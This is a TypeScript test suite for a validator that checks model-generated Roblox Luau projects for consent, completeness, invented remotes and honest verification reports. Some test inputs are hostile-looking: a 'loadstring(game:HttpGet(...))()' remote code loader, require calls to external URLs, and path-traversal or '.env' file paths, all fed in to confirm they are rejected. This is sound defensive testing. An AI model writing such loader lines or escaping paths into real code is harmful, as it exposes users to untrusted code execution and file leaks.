import test from "node:test";
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { basename, dirname, join, resolve } from "node:path";
import { applyTargetedProjectEdits, generateEvidenceProject, validateEvidenceProject, validateProjectFiles, type ProjectStageContext } from "../src/lib/knowledge-project.ts";

const files = [{ path: "src/main.client.luau", content: "local Players = game:GetService(\"Players\")\nprint(Players.LocalPlayer)\n" }, { path: "src/Utility.luau", content: "return { value = 42 }\n" }];
const plan = { references: [{ id: "indexed-source" }], features: [{ name: "Local status" }], unknowns: ["No observed game quest interface."] };
const context = (extra: Partial<ProjectStageContext> = {}): ProjectStageContext => ({ input: { request: "Create local status", role: "project_client", intent: "generate", allowModelProcessing: true }, plan, currentFiles: [], deadlineMs: Date.now() + 20000, ...extra });
const output = (extra = {}) => ({ files, features: [{ name: "Local status", implementationStatus: "implemented", sourceIds: ["indexed-source"] }], unknowns: [], ...extra });
const model = (value: unknown, incomplete = false) => async () => ({ content: typeof value === "string" ? value : JSON.stringify(value), model: "offline-fixture", incomplete, attempts: 1 });
async function cleanup(directory: string) {
  const target = resolve(directory);
  assert.equal(dirname(target), resolve(tmpdir())); assert.ok(basename(target).startsWith("scriptrush-project-test-"));
  await rm(target, { recursive: true, force: true });
}

test("complete multifile artifacts retain exact contents and cannot claim game verification", async () => {
  const result = await generateEvidenceProject(context(), model(output()));
  assert.deepEqual(result.files, files);
  assert.equal(result.report.gameFunctionalityVerified, false);
  assert.equal(result.report.claim100PercentFunctionality, false);
  assert.deepEqual(result.report.unknowns, plan.unknowns);
  assert.equal(result.report.usage.providerTokens, null);
  assert.equal(result.report.usage.monetaryCost, null);
  assert.equal(result.report.features[0].modelDeclaredStatus, "implemented");
  assert.equal(result.report.features[0].verificationStatus, "unverified");
  assert.equal("implementationStatus" in result.report.features[0], false);
});

test("private code consent and exhausted budgets stop before any provider request", async () => {
  let calls = 0;
  const fake = async () => { calls++; return { content: "", model: "none", incomplete: false }; };
  await assert.rejects(generateEvidenceProject(context({ input: { ...context().input, allowModelProcessing: false } }), fake), /CONSENT_REQUIRED/);
  await assert.rejects(generateEvidenceProject(context({ modelBudget: { remainingAttempts: 0, attempts: 1, timeoutMs: 1000 } }), fake), /ATTEMPTS_EXHAUSTED/);
  assert.equal(calls, 0);
});

test("truncated and malformed model responses produce no project or synthetic fallback", async () => {
  await assert.rejects(generateEvidenceProject(context(), model(output(), true)), /INCOMPLETE/);
  await assert.rejects(generateEvidenceProject(context(), model("{\"files\":[")), /INVALID_PROJECT_JSON/);
  await assert.rejects(generateEvidenceProject(context(), model(output({ files: [files[0]] }))), /MULTIFILE/);
});

test("every planned feature and every cited source must exist", async () => {
  await assert.rejects(generateEvidenceProject(context(), model(output({ features: [] }))), /FEATURE_MISSING/);
  await assert.rejects(generateEvidenceProject(context(), model(output({ features: [{ name: "Local status", implementationStatus: "implemented", sourceIds: ["invented"] }] }))), /UNINDEXED/);
});

test("public descriptions and licensed reference IDs cannot authorize an invented game remote", async () => {
  const candidate = output({ files: [{ ...files[0], content: files[0].content + "QuestRemote:FireServer(\"ClaimQuest\")\n" }, files[1]] });
  await assert.rejects(generateEvidenceProject(context(), model(candidate)), /UNPROVEN_GAME_REMOTE/);
});

test("server imports and external loaders are rejected in a client project", async () => {
  for (const code of ["local data = game:GetService(\"DataStoreService\")", "local module = require(12345)", "loadstring(game:HttpGet(\"https://invalid.example\"))()"]) {
    await assert.rejects(generateEvidenceProject(context(), model(output({ files: [{ ...files[0], content: code }, files[1]] }))), /ROLE_INCOMPATIBLE|EXTERNAL_CODE/);
  }
});

test("indirect remote calls, external dot calls, and missing modules are rejected", async () => {
  for (const code of ["remote.FireServer(remote, 'Invented')", "remote['FireServer'](remote, 'Invented')", "game.HttpGet(game, 'https://invalid.example')", "require('https://invalid.example')", "require(script.Parent.DoesNotExist)"]) {
    await assert.rejects(generateEvidenceProject(context(), model(output({ files: [{ ...files[0], content: code }, files[1]] }))), /UNPROVEN|EXTERNAL_CODE|MISSING_PROJECT_DEPENDENCY|UNRESOLVED_DYNAMIC_RUNTIME_CALL/);
  }
  await assert.rejects(generateEvidenceProject(context({ input: { ...context().input, role: "project_server" } }), model(output({ files: [{ path: "src/main.server.luau", content: "local p = game:GetService('Players').LocalPlayer" }, files[1]] }))), /ROLE_INCOMPATIBLE_CLIENT/);
  await assert.rejects(generateEvidenceProject(context(), model(output({ files: [{ ...files[0], path: "src/App.luau" }, files[1]] }))), /MISSING_RUNTIME_ENTRYPOINT/);
});

test("untrusted output paths cannot escape the project or collide by case", () => {
  for (const path of ["../leak.lua", "C:/leak.lua", "/leak.lua", ".env", "src/../../leak.lua", "src\\leak.lua", "src/run.js"]) {
    assert.throws(() => validateProjectFiles([{ path, content: "data" }]), /INVALID_PROJECT_PATH/);
  }
  assert.throws(() => validateProjectFiles([{ path: "src/A.lua", content: "x" }, { path: "src/a.lua", content: "y" }]), /INVALID_PROJECT_PATH/);
});

test("computed remote/service names are rejected without a compatibility claim", async () => {
  for (const code of ['r["Fire" .. "Server"](r,"InventedQuest")', 'game:GetService("Data" .. "StoreService"):GetAsync("Invented")', 'game:GetService(serviceName)']) {
    await assert.rejects(generateEvidenceProject(context(), model(output({ files: [{ ...files[0], content: code }, files[1]] }))), /UNRESOLVED_DYNAMIC_RUNTIME_CALL|UNPINNED_EXTERNAL_CODE/);
  }
});

test("repair changes one exact span and preserves unrelated files and functions byte for byte", async () => {
  const source = "local speed = 16\n" + "-- unrelated behavior retained\n".repeat(15) + "local function untouched() return 99 end\n";
  const project = [{ ...files[0], content: source }, files[1]];
  const patch = { edits: [{ path: project[0].path, oldText: "local speed = 16", newText: "local speed = 20" }], features: [], unknowns: [] };
  const result = await generateEvidenceProject(context({ input: { ...context().input, intent: "patch" }, currentFiles: project }), model(patch));
  assert.equal(result.files[0].content, source.replace("local speed = 16", "local speed = 20"));
  assert.deepEqual(result.files[1], project[1]);
  assert.match(result.report.diff, /-local speed = 16\n\+local speed = 20/);
  assert.deepEqual(result.report.changedPaths, [project[0].path]);
});

test("repair cannot replace an entire existing file or choose an ambiguous span", () => {
  const project = [{ path: "src/main.lua", content: "print(\"keep\")\n".repeat(30) }];
  assert.throws(() => applyTargetedProjectEdits(project, [{ path: project[0].path, oldText: project[0].content, newText: "print(\"replacement\")" }]), /WHOLE_FILE/);
  assert.throws(() => applyTargetedProjectEdits(project, [{ path: project[0].path, oldText: "keep", newText: "different" }]), /NOT_UNIQUE/);
  assert.throws(() => applyTargetedProjectEdits(project, [{ path: "src/new.lua", oldText: "keep", newText: "different" }]), /INVALID_TARGETED/);
});

test("an unrelated fix retains existing remotes but cannot silently invent new arguments", async () => {
  const project = [{ path: "src/main.lua", content: "local speed = 16\nQuestRemote:FireServer(\"ExistingAction\")\n" + "-- untouched\n".repeat(20) }];
  const ctx = context({ input: { ...context().input, intent: "patch" }, currentFiles: project });
  const valid = await generateEvidenceProject(ctx, model({ edits: [{ path: project[0].path, oldText: "local speed = 16", newText: "local speed = 20" }], features: [], unknowns: [] }));
  assert.match(valid.files[0].content, /ExistingAction/);
  await assert.rejects(generateEvidenceProject(ctx, model({ edits: [{ path: project[0].path, oldText: "ExistingAction", newText: "InventedQuest" }], features: [], unknowns: [] })), /UNPROVEN_GAME_REMOTE/);
});

test("indexed licence attributions retain complete notice and cannot be forged by the writer", async () => {
  const text = "Copyright 2026 Example\nComplete notice retained by the independent index.";
  const license = { sourceId: "indexed-source", repo: "example/repository", commitSha: "a".repeat(40), path: "LICENSE", url: "https://github.com/example/repository/blob/" + "a".repeat(40) + "/LICENSE", text, sha256: createHash("sha256").update(text).digest("hex") };
  const ctx = context({ plan: { ...plan, licenseAttributions: [license] } });
  const result = await generateEvidenceProject(ctx, model(output()));
  assert.ok(result.files.some(file => file.path.startsWith("licenses/") && file.content.endsWith(text)));
  await assert.rejects(generateEvidenceProject(context({ plan: { ...plan, licenseAttributions: [{ ...license, text: "replaced notice" }] } }), model(output())), /LICENSE_ATTRIBUTION_PROOF_CHANGED/);
});

test("missing or unavailable compiler never reports compilation passed or executed", async () => {
  for (const options of [{}, { compilerPath: join(tmpdir(), "scriptrush-nonexistent-compiler-981127.exe") }]) {
    const result = await validateEvidenceProject(files, options);
    assert.equal(result.compilation.status, "not_checked");
    assert.equal(result.compilation.executed, false);
    assert.equal(result.mockTests.status, "not_run");
    assert.equal(result.inGameTests.status, "not_run");
    assert.equal(result.runtimeCompatibility, "unknown");
  }
});

const compilerPath = process.env.SCRIPTRUSH_TEST_LUAU_COMPILE;
test("actual Luau compilation distinguishes complete syntax from a broken file", { skip: !compilerPath }, async () => {
  const passed = await validateEvidenceProject(files, { compilerPath });
  assert.equal(passed.compilation.status, "passed"); assert.equal(passed.compilation.executed, true);
  assert.equal(passed.compilation.evidence.length, 2);
  const failed = await validateEvidenceProject([{ ...files[0], content: "local function broken(\n" }, files[1]], { compilerPath });
  assert.equal(failed.compilation.status, "failed"); assert.equal(failed.inGameTests.executed, false);
});

test("mock reports must contain executed assertions bound to every exact file hash", { skip: !compilerPath }, async () => {
  const directory = await mkdtemp(join(tmpdir(), "scriptrush-project-test-"));
  try {
    const runner = join(directory, "runner.mjs");
    await writeFile(runner, "import{readFileSync,writeFileSync}from'node:fs';const p=JSON.parse(readFileSync(process.argv[2]));p.fileHashes['src/Utility.luau']='wrong';writeFileSync(process.argv[3],JSON.stringify({executed:true,fileHashes:p.fileHashes,assertions:[{name:'inert validator fixture',passed:true}]}));");
    const result = await validateEvidenceProject(files, { compilerPath, mockRunnerPath: runner });
    assert.equal(result.mockTests.status, "failed"); assert.equal(result.mockTests.executed, false);
    assert.equal(result.runtimeCompatibility, "unknown");
  } finally { await cleanup(directory); }
});

test("closed simulation executes candidate lifecycle code and detects broken cleanup", { skip: !compilerPath || !process.env.SCRIPTRUSH_LUAU_RUNNER }, async () => {
  const fixture = JSON.parse(await (await import("node:fs/promises")).readFile(new URL("./fixtures/knowledge-project-demo.json", import.meta.url), "utf8"));
  const options = { compilerPath, mockRunnerPath: resolve("scripts/knowledge-v2-mock-runner.mjs") };
  const passed = await validateEvidenceProject(fixture.files, options);
  assert.equal(passed.compilation.status, "passed");
  assert.equal(passed.mockTests.status, "passed"); assert.equal(passed.mockTests.executed, true);
  assert.equal(passed.mockTests.evidence.length, 8);
  const broken = fixture.files.map((file: { path: string; content: string }) => ({ ...file, content: file.content.replace("connection:Disconnect()", "local ignored = connection") }));
  const failed = await validateEvidenceProject(broken, options);
  assert.equal(failed.compilation.status, "passed");
  assert.equal(failed.mockTests.status, "failed"); assert.equal(failed.mockTests.executed, true);
  assert.ok(failed.mockTests.evidence.some(line => line.includes("Stop disconnects") && line.includes("failed")));
  assert.equal(failed.inGameTests.executed, false);
});
